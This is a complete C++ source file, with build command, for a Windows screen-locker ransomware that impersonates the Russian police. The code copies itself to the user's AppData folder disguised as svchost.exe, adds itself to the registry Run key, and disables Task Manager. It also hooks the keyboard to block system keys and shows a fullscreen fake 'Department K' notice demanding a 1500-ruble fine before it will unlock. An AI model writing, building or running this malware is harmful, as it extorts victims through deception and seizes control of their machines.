// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>

#pragma execution_character_set("utf-8")

// Код разблокировки (в честь 146 статьи)
static const std::wstring kPassword = L"1461";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;
static bool    g_blink     = false;

static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Жестко блокируем системные клавиши
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE || p->vkCode == VK_F12) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

static void Unlock() {
    g_locked = false;
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    UnhookWindowsHookEx(g_kbHook);
    DestroyWindow(g_hwnd);
    PostQuitMessage(0);
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(FALSE); // Курсор скрыт для пущего эффекта
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);

        SetTimer(h, 1, 500, nullptr); // Таймер для мигающего курсора
        return 0;
    }
    case WM_TIMER: {
        g_blink = !g_blink;
        InvalidateRect(h, nullptr, FALSE);
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        int cx = rc.right;
        int cy = rc.bottom;

        // 1. Фон (Классический серый, как в старых окнах)
        HBRUSH bg = CreateSolidBrush(RGB(200, 200, 200));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        // 2. Верхняя синяя полоса (заголовок окна)
        RECT rcTop = {0, 0, cx, 40};
        HBRUSH topBg = CreateSolidBrush(RGB(0, 80, 160));
        FillRect(dc, &rcTop, topBg);
        DeleteObject(topBg);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));
        HFONT fTitleBar = CreateFontW(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fTitleBar);
        RECT rcTopText = {10, 0, cx, 40};
        DrawTextW(dc, L"Внимание! Ваш компьютер заблокирован", -1, &rcTopText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // 3. Основной блок (белая панель)
        int panelW = 800;
        int panelH = 500;
        int panelX = (cx - panelW) / 2;
        int panelY = 80;
        RECT rcPanel = {panelX, panelY, panelX + panelW, panelY + panelH};
        
        HBRUSH panelBg = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcPanel, panelBg);
        DeleteObject(panelBg);
        
        FrameRect(dc, &rcPanel, (HBRUSH)GetStockObject(GRAY_BRUSH));

        // 4. Логотип (стилизованный щит)
        int logoX = panelX + 20;
        int logoY = panelY + 20;
        HBRUSH shieldBg = CreateSolidBrush(RGB(220, 220, 220));
        RECT rcShield = {logoX, logoY, logoX + 100, logoY + 100};
        FillRect(dc, &rcShield, shieldBg);
        DeleteObject(shieldBg);
        FrameRect(dc, &rcShield, (HBRUSH)GetStockObject(BLACK_BRUSH));
        
        SetTextColor(dc, RGB(0, 0, 0));
        HFONT fLogo = CreateFontW(40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Arial");
        SelectObject(dc, fLogo);
        DrawTextW(dc, L"МВД", -1, &rcShield, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // 5. Заголовок внутри панели
        HFONT fHeader = CreateFontW(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fHeader);
        SetTextColor(dc, RGB(180, 0, 0));
        RECT rcHeader = {logoX + 120, logoY, panelX + panelW - 20, logoY + 60};
        DrawTextW(dc, L"Ваш компьютер заблокирован", -1, &rcHeader, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // 6. Основной текст
        HFONT fText = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fText);
        SetTextColor(dc, RGB(0, 0, 0));
        
        int textY = logoY + 120;
        RECT rcText = {panelX + 20, textY, panelX + panelW - 20, panelY + panelH};
        
        const wchar_t* mainText = 
            L"Уважаемый пользователь!\n\n"
            L"Ваш компьютер был заблокирован сотрудниками Отдела К по причине\n"
            L"нарушения статьи 146 Уголовного Кодекса РФ (Незаконное использование\n"
            L"объектов авторского права).\n\n"
            L"В ходе проверки было установлено, что с вашего IP-адреса\n"
            L"осуществлялось распространение нелицензионного программного обеспечения.\n\n"
            L"Для разблокировки вашего компьютера вам необходимо оплатить штраф\n"
            L"в размере 1500 рублей. Оплата производится через терминалы\n"
            L"мгновенной оплаты (Qiwi, WebMoney, Яндекс.Деньги).\n\n"
            L"После оплаты вы получите код разблокировки, который нужно ввести\n"
            L"в поле ниже.";
            
        DrawTextW(dc, mainText, -1, &rcText, DT_LEFT | DT_TOP | DT_WORDBREAK);

        // 7. Поле ввода
        int inputY = panelY + panelH - 100;
        RECT rcInputLabel = {panelX + 20, inputY - 30, panelX + 300, inputY};
        DrawTextW(dc, L"Код разблокировки:", -1, &rcInputLabel, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        RECT rcInput = {panelX + 20, inputY, panelX + 400, inputY + 30};
        HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcInput, white);
        DeleteObject(white);
        FrameRect(dc, &rcInput, (HBRUSH)GetStockObject(GRAY_BRUSH));
        
        SetTextColor(dc, RGB(0, 0, 0));
        RECT rcInputText = rcInput; rcInputText.left += 5;
        DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Мигающий курсор
        if (g_blink) {
            SIZE sz;
            GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 3, rcInputText.bottom - 5};
            HBRUSH curBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(dc, &rcCursor, curBrush);
            DeleteObject(curBrush);
        }

        // 8. Кнопка "Разблокировать"
        RECT rcBtn = {panelX + 420, inputY, panelX + 550, inputY + 30};
        HBRUSH btnBg = CreateSolidBrush(RGB(220, 220, 220));
        FillRect(dc, &rcBtn, btnBg);
        DeleteObject(btnBg);
        FrameRect(dc, &rcBtn, (HBRUSH)GetStockObject(BLACK_BRUSH));
        
        SetTextColor(dc, RGB(0, 0, 0));
        DrawTextW(dc, L"Разблокировать", -1, &rcBtn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // 9. Нижняя панель с "пометками"
        RECT rcBottom = {0, cy - 40, cx, cy};
        HBRUSH bottomBg = CreateSolidBrush(RGB(240, 240, 240));
        FillRect(dc, &rcBottom, bottomBg);
        DeleteObject(bottomBg);
        
        SetTextColor(dc, RGB(100, 100, 100));
        HFONT fSmall = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Tahoma");
        SelectObject(dc, fSmall);
        RECT rcBottomText = {10, cy - 40, cx - 10, cy};
        DrawTextW(dc, L"© 2012 Отдел К. Все права защищены. Лицензия №146-УК.", -1, &rcBottomText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        DeleteObject(fTitleBar);
        DeleteObject(fLogo);
        DeleteObject(fHeader);
        DeleteObject(fText);
        DeleteObject(fSmall);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) {
            g_input.pop_back();
        } else if (w >= 32 && w < 127 && g_input.length() < 15) {
            g_input.push_back((wchar_t)w);
        }
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            if (g_input == kPassword) {
                Unlock();
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
